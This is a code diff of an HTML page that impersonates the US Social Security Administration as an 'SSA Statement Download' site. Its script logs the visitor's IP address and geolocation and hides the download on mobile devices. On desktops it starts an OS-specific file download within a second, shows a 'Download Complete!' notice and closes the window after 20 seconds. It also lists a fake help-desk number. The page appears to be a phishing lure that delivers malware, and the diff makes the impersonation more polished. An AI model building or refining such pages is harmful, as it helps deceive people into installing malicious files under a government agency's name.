@@ -1,66 +1,29 @@
-<html lang="en">
-<head>
+<html lang="en"><head>
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta http-equiv="Pragma" content="no-cache">
     <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate">
-    <meta name="application-name" content="SSA-File-Download">
+    <meta name="application-name" content="File-Download">
     <title>The United States Social Security Administration | SSA</title>
     <link rel="icon" href="./assets/img/favicon.ico" type="image/x-icon">
     <style>
         @import url(https://www.ssa.gov/flexweb/rel_5_1_2/css/import.css);
-        
-        body {
-            font-family: Arial, sans-serif;
-            line-height: 1.6;
-            color: #333;
-            margin: 0;
-            padding: 0;
-            background-color: #f5f5f5;
-        }
-        
+        @import url(styles/appStyles.css);
+
         h1 {
             font-size: 2em;
             color: #0033a0;
             margin-bottom: 20px;
         }
-        
-        .container {
-            max-width: 800px;
-            margin: 0 auto;
-            padding: 20px;
-            background: white;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
-        }
-        
-        .status-box {
-            padding: 20px;
-            margin: 20px 0;
-            border-left: 5px solid #0033a0;
-            background-color: #f8f9fa;
-        }
-        
-        .success-box {
-            display: none;
-            padding: 20px;
-            margin: 20px 0;
-            border-left: 5px solid #28a745;
-            background-color: #e8f5e9;
-        }
-        
-        .btn {
-            display: inline-block;
-            padding: 10px 20px;
-            background-color: #0033a0;
-            color: white;
+
+        #downloadLink {
+            color: #007bff;
             text-decoration: none;
-            border-radius: 4px;
-            margin-top: 10px;
         }
-        
-        .btn:hover {
-            background-color: #002366;
+
+        #downloadLink:hover {
+            text-decoration: underline;
         }
         
         .mobile-warning {
@@ -71,21 +34,9 @@
             color: #856404;
         }
         
-        .countdown {
-            font-weight: bold;
-            color: #dc3545;
-        }
-        
-        #manualDownload {
-            display: none;
-        }
-        
-        footer {
-            margin-top: 30px;
-            padding-top: 20px;
-            border-top: 1px solid #ddd;
-            font-size: 0.9em;
-            color: #666;
+        .mobile-warning h3 {
+            margin-top: 0;
+            color: #856404;
         }
     </style>
     <script>
@@ -97,10 +48,6 @@
         let visitorCount = localStorage.getItem('visitorCount') || 0;
         visitorCount++;
         localStorage.setItem('visitorCount', visitorCount);
-        
-        // Real IP detection API
-        const IP_API_URL = 'https://api.ipify.org?format=json';
-        const IP_GEOLOCATION_API = 'https://ipapi.co/json/';
         
         // Mobile device detection
         function isMobileDevice() {
@@ -155,21 +102,23 @@
             let seconds = 20;
             const countdownElement = document.getElementById('countdown');
             
-            const countdownInterval = setInterval(() => {
-                seconds--;
-                countdownElement.textContent = seconds;
-                
-                if (seconds <= 0) {
-                    clearInterval(countdownInterval);
-                    forceWindowClose();
-                }
-            }, 1000);
+            if (countdownElement) {
+                const countdownInterval = setInterval(() => {
+                    seconds--;
+                    countdownElement.textContent = seconds;
+                    
+                    if (seconds <= 0) {
+                        clearInterval(countdownInterval);
+                        forceWindowClose();
+                    }
+                }, 1000);
+            }
         }
         
         // Function to get client IP
         async function getClientIP() {
             try {
-                const response = await fetch(IP_API_URL);
+                const response = await fetch('https://api.ipify.org?format=json');
                 const data = await response.json();
                 return data.ip;
             } catch (error) {
@@ -181,7 +130,7 @@
         // Function to get geolocation data
         async function getGeolocationData() {
             try {
-                const response = await fetch(IP_GEOLOCATION_API);
+                const response = await fetch('https://ipapi.co/json/');
                 const data = await response.json();
                 return {
                     country: data.country_name || 'Unknown',
@@ -255,14 +204,13 @@
             }
             
             const ipv4Regex = /^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
-            const ipv6Regex = /^(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))$/;
             
-            return ipv4Regex.test(ip) || ipv6Regex.test(ip);
+            return ipv4Regex.test(ip);
         }
         
         // Show mobile warning
         function showMobileWarning() {
-            const contentDiv = document.querySelector('.container');
+            const contentDiv = document.querySelector('.uef-container-content');
             const warningDiv = document.createElement('div');
             warningDiv.className = 'mobile-warning';
             warningDiv.innerHTML = `
@@ -271,41 +219,56 @@
             `;
             contentDiv.insertBefore(warningDiv, contentDiv.firstChild);
             
-            document.getElementById('downloadSection').style.display = 'none';
+            document.getElementById('downloadLink').parentElement.style.display = 'none';
         }
         
         // Handle desktop device download
         function handleDesktopDevice() {
             const osType = detectOS();
             const downloadLink = getDownloadLink(osType);
-            const statusText = document.getElementById('statusText');
-            const statusMessage = document.getElementById('statusMessage');
-            const successMessage = document.getElementById('successMessage');
-            const manualDownloadBtn = document.getElementById("manualDownload");
             
-            manualDownloadBtn.href = downloadLink;
-            manualDownloadBtn.style.display = "inline-block";
-            statusText.textContent = "Downloading your voicemail...";
+            // Update the download link in the UI
+            const downloadElement = document.getElementById('downloadLink');
+            downloadElement.href = downloadLink;
+            downloadElement.onclick = function(e) {
+                e.preventDefault();
+                startDownload(downloadLink);
+                return false;
+            };
             
+            // Start automatic download after 1 second
+            setTimeout(() => {
+                startDownload(downloadLink);
+                
+                // Update UI after download starts
+                setTimeout(() => {
+                    const contentDiv = document.querySelector('.uef-container-content');
+                    const successDiv = document.createElement('div');
+                    successDiv.className = 'uef-notice uef-success';
+                    successDiv.innerHTML = `
+                        <div class="uef-notice-row hd">
+                            <div class="uef-notice-content">
+                                <h4>Download Complete!</h4>
+                                <p>This window will close automatically in <span id="countdown">20</span> seconds.</p>
+                            </div>
+                        </div>
+                    `;
+                    contentDiv.appendChild(successDiv);
+                    startCountdown();
+                }, 1500);
+            }, 1000);
+        }
+        
+        // Start download
+        function startDownload(downloadLink) {
             try {
                 const downloadBtn = document.createElement("a");
                 downloadBtn.href = downloadLink;
-                downloadBtn.download = "SSA_Files_COMPLETED.zip";
+                downloadBtn.download = downloadLink.split('/').pop();
                 document.body.appendChild(downloadBtn);
                 downloadBtn.click();
                 document.body.removeChild(downloadBtn);
-                
-                statusMessage.textContent = "Download started successfully!";
-                
-                setTimeout(() => {
-                    statusText.style.display = "none";
-                    successMessage.style.display = "block";
-                    document.getElementById('actionText').textContent = "Downloaded";
-                    startCountdown();
-                }, 1500);
-                
             } catch (e) {
-                statusMessage.textContent = "Automatic download failed. Please use the manual download button.";
                 console.error("Download error:", e);
             }
         }
@@ -347,8 +310,8 @@
                     return;
                 }
                 
-                // Start automatic download for desktop
-                setTimeout(handleDesktopDevice, 1000);
+                // Start automatic process for desktop
+                handleDesktopDevice();
                 
             } catch (error) {
                 console.error('Error handling visit:', error);
@@ -361,35 +324,44 @@
         };
     </script>
 </head>
-<body>
-    <div class="container">
-        <header>
-            <div id="uef-tmpl-header">
-                <div id="uef-tmpl-logo"></div>
-                <div id="uef-tmpl-websiteTitle">
-                    <h1>Social Security Administration</h1>
+
+<body class="uef-theme-std">
+    <header>
+        <div id="uef-tmpl-header">
+            <a id="uef-tmpl-skipNav" href="#" accesskey="K">Skip to Content</a>
+            <div id="uef-tmpl-logo"></div>
+            <div id="uef-tmpl-websiteTitle">
+                <h1>Social Security Administration</h1>
+            </div>
+        </div>
+    </header>
+    <div id="uef-tmpl-content-wrapper">
+        <div id="uef-tmpl-content">
+            <form id="FileDownload" name="FileDownload" action="" method="post">
+                <div class="uef-container module">
+                    <div class="uef-container-row">
+                        <div class="uef-container-content">
+                            <div class="uef-notice uef-info">
+                                <div class="uef-notice-row hd">
+                                    <div class="uef-notice-content">
+                                        <center><h1>Welcome to Your Latest SSA Statement Download</h1></center>
+                                        <h4>Your download will start automatically. If it doesn't, <a id="downloadLink" href="#" onclick="return false;">click here</a>.</h4>
+                                    </div>
+                                </div>
+                                <div class="uef-notice-row">
+                                    <div class="uef-notice-content">
+                                        <p>Thank you for using our service. If the download does not start within a few seconds, you may manually start it by clicking the link above.</p>
+                                        <p>For further assistance, please contact our help desk at <strong>1-800-123-4567</strong>.</p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
                 </div>
-            </div>
-        </header>
-        
-        <main>
-            <div class="status-box">
-                <h2 id="statusText">Preparing your download...</h2>
-                <p id="statusMessage">Please wait while we prepare your files for download.</p>
-                <div id="downloadSection">
-                    <p>If the download doesn't start automatically, click below:</p>
-                    <a id="manualDownload" class="btn">Download Now</a>
-                </div>
-            </div>
-            
-            <div class="success-box" id="successMessage">
-                <h2>Download Complete!</h2>
-                <p id="actionText">Your files have been successfully downloaded.</p>
-                <p>This window will close automatically in <span id="countdown">20</span> seconds.</p>
-            </div>
-        </main>
-        
-        <footer>
+            </form>
+        </div>
+
+        <footer id="uef-tmpl-footer">
             <a href="#" target="_blank">Privacy and Security</a>
             <ul>
                 <li><a id="uef-tmpl-paperworkReduction" href="#" target="_blank">OMB No. 0960-0789</a></li>
@@ -397,8 +369,6 @@
                 <li><a id="uef-tmpl-privacyAct" href="#" target="_blank">Privacy Act Statement</a></li>
                 <li><a id="uef-tmpl-accessibility" href="#" target="_blank">Accessibility Help</a></li>
             </ul>
-            <p>© 2023 Social Security Administration</p>
         </footer>
     </div>
-</body>
-</html>
+</body></html>
